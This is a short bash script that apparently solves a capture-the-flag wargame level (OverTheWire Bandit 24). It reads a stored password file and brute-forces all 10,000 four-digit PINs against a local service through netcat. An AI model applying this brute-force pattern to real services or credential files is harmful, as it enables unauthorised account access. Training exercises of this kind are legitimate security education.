#!/bin/bash
 
{
for i in {0000..9999}; do
   PASSWORD=$(cat /etc/bandit_pass/bandit24)
   echo "$PASSWORD $i"
done
} | nc localhost 30002 | grep -m2 "bandit25"
